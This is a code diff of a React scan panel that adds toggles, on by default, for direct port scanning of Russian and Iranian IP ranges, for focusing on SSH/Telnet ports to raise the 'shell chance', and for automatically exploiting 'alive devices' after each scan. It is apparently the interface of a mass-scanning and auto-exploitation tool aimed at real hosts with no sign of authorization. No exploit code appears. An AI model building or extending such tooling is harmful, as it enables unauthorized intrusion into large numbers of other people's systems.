@@ -17,6 +17,10 @@ export default function ScanPanel({ onScanComplete }) {
   const fileRef = useRef(null)
 
   const [sampleSize, setSampleSize] = useState(500)
+  const [directScan, setDirectScan] = useState(true)
+  const [directSample, setDirectSample] = useState(2000)
+  const [autoExploit, setAutoExploit] = useState(true)
+  const [sshFocused, setSshFocused] = useState(true)
 
   const [scraper, setScraper] = useState({ running: false, interval: 600, last_run: {} })
   const [scraperInterval, setScraperInterval] = useState('10')
@@ -86,7 +90,14 @@ export default function ScanPanel({ onScanComplete }) {
     setActive(true); setLogs([]); setElapsed(0); setStatus(null)
     try {
       const res = await fetch('/api/scans/trigger', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sample_size: sampleSize }),
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sample_size: sampleSize,
+          auto_exploit: autoExploit,
+          direct_scan: directScan,
+          direct_sample: directSample,
+          ssh_focused: sshFocused,
+        }),
       })
       const data = await res.json()
       if (data.status === 'already_running')
@@ -251,15 +262,44 @@ export default function ScanPanel({ onScanComplete }) {
               min={1}
               max={10000}
               disabled={active}
-              title="Number of new devices to scan"
+              title="InternetDB sample size"
             />
-            <span className="sample-size-label">devices</span>
+            <span className="sample-size-label">InternetDB</span>
           </div>
           <button className="btn-scan" onClick={startScan} disabled={active}>
             {active ? (
               <span className="btn-scan-active"><span className="spinner" /> Scanning...</span>
             ) : 'Run Scan'}
           </button>
+        </div>
+        <div className="scan-options-row">
+          <label className="scan-toggle" title="Direct port scan of RU/IR IP ranges">
+            <input type="checkbox" checked={directScan} onChange={e => setDirectScan(e.target.checked)} disabled={active} />
+            <span>Direct Scan</span>
+          </label>
+          {directScan && (
+            <div className="sample-size-group sample-size-small">
+              <input
+                type="number"
+                className="sample-size-input"
+                value={directSample}
+                onChange={e => setDirectSample(Math.max(100, parseInt(e.target.value) || 100))}
+                min={100}
+                max={50000}
+                disabled={active}
+                title="Direct scan sample size per country"
+              />
+              <span className="sample-size-label">IPs</span>
+            </div>
+          )}
+          <label className="scan-toggle" title="Focus on SSH/Telnet ports (higher shell chance)">
+            <input type="checkbox" checked={sshFocused} onChange={e => setSshFocused(e.target.checked)} disabled={active} />
+            <span>SSH Focus</span>
+          </label>
+          <label className="scan-toggle" title="Auto-exploit alive devices after scan">
+            <input type="checkbox" checked={autoExploit} onChange={e => setAutoExploit(e.target.checked)} disabled={active} />
+            <span>Auto-Exploit</span>
+          </label>
         </div>
       </div>
 
